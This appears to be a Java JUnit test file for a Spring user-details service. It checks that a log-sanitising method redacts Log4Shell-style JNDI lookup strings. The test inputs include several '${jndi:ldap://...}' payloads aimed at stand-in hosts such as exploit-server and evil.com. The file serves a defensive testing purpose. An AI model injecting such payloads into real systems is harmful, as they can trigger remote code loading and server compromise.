package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import java.lang.reflect.Method;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
public class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    @Test
    public void testLoadUserByUsernameWithMaliciousInput() throws Exception {
        // Setup
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections}";
        User mockUser = new User();
        mockUser.setUsername("sanitizedUser");
        mockUser.setPassword("password");
        mockUser.setEnabled(true);
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(mockUser);
        
        // Execute - this should not throw an exception
        UserDetails result = customUserDetailsService.loadUserByUsername(maliciousUsername);
        
        // Verify
        assertNotNull(result);
        assertEquals("sanitizedUser", result.getUsername());
        assertEquals("password", result.getPassword());
        assertTrue(result.isEnabled());
    }

    @Test
    public void testLoadUserByUsernameWithNormalInput() {
        // Setup
        String username = "normal-user";
        User mockUser = new User();
        mockUser.setUsername(username);
        mockUser.setPassword("password");
        mockUser.setEnabled(true);
        
        when(userService.findByUsername(username)).thenReturn(mockUser);
        
        // Execute
        UserDetails result = customUserDetailsService.loadUserByUsername(username);
        
        // Verify
        assertNotNull(result);
        assertEquals(username, result.getUsername());
        assertEquals("password", result.getPassword());
        assertTrue(result.isEnabled());
    }

    @Test
    public void testLoadUserByUsernameWithNonExistentUser() {
        // Setup
        String username = "nonexistent";
        
        when(userService.findByUsername(username)).thenReturn(null);
        
        // Execute & Verify
        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(username);
        });
    }

    @Test
    public void testSanitizeLogParam() throws Exception {
        // Access private method using reflection
        Method sanitizeMethod = CustomUserDetailsService.class.getDeclaredMethod("sanitizeLogParam", String.class);
        sanitizeMethod.setAccessible(true);
        
        // Test various payloads
        String jndiPayload = "${jndi:ldap://exploit-server:1389/payload}";
        String result = (String) sanitizeMethod.invoke(customUserDetailsService, jndiPayload);
        assertEquals("[REDACTED]", result);
        
        // Test complex payload
        String complexPayload = "username${jndi:ldap://evil.com/payload}more-text";
        String complexResult = (String) sanitizeMethod.invoke(customUserDetailsService, complexPayload);
        assertEquals("username[REDACTED]more-text", complexResult);
        
        // Test normal input
        String normalInput = "normal-username";
        String normalResult = (String) sanitizeMethod.invoke(customUserDetailsService, normalInput);
        assertEquals("normal-username", normalResult);
        
        // Test null input
        String nullResult = (String) sanitizeMethod.invoke(customUserDetailsService, null);
        assertNull(nullResult);
    }
}